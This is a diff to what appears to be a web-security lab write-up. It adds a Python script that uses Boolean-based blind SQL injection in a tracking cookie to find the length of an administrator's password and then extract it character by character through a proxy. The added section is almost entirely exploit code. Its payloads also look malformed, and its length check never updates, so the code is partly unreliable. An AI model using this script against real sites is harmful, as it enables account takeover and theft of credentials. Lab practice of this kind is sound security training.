@@ -184,6 +184,63 @@ if __name__ == "__main__":
         print("There is an error or no index for the SQL.")
 ```
 
+## after this most of the lab are uses the same method.we gone skip to Blind sql injection
+
+## Lab 11: Blind sql injection for Password Exploitation Script
+
+- **Description**: The script leverages a Boolean-based SQL injection technique to determine the length of the administrator's password and subsequently extract it character by character. This type of SQL injection relies on altering SQL queries to return true or false based on the input, thereby revealing information about the database structure or data.
+- **Script**: `sql_injection5.py`
+- **Status**: Completed
+
+```bash
+
+import urllib.parse
+import requests
+import urllib3
+import urllib
+import sys
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies= {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
+
+def len_password(url):
+    n=0
+    payload=f"'(select 'a' from users where username='administrator' and LEN(password)>={n}))"
+    payload_encoded=urllib.parse.quote(payload)
+    cookies={"tarackid":"gwQNMaBG6YlAsRN0"+payload_encoded,"session":"xVejDqtVc8ibqWPo83lY76b2LOATzhDN"}
+    for i in range(1,50):
+        ra=requests.get(url,cookies=cookies,verify=False,proxies=proxies)
+        if ('welcome' in ra.text):
+            n+=1
+        else:
+            return n
+    return n
+
+def exploit_password(url,num_password):
+    password=[]
+    for i in range(1,num_password+1):
+        for j in range(32,126):
+            payload=f"' select SUBSTRING(password,{i},1) from users where username='administrator')='ascii({j})"
+            payload_encoded=urllib.parse.quote(payload)
+            cookies={"tarackid":"gwQNMaBG6YlAsRN0"+payload_encoded,'session':"xVejDqtVc8ibqWPo83lY76b2LOATzhDN"}
+            ra=requests.get(url,cookies=cookies,verify=False,proxies=proxies)
+            if 'welcome' in ra.text:
+                password.append(chr(j))
+                break
+    print(f"the password fo the administrator user is :{''.join(password)}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("use file.py <url> ")
+        sys.exit(1)
+    url = sys.argv[1]
+    print("- you start bruet false the password")
+    trackID="gwQNMaBG6YlAsRN0"
+    num_password=len_password(url)
+    exploit_password(url,num_password)
+
+```
 
 # Disclaimer
 
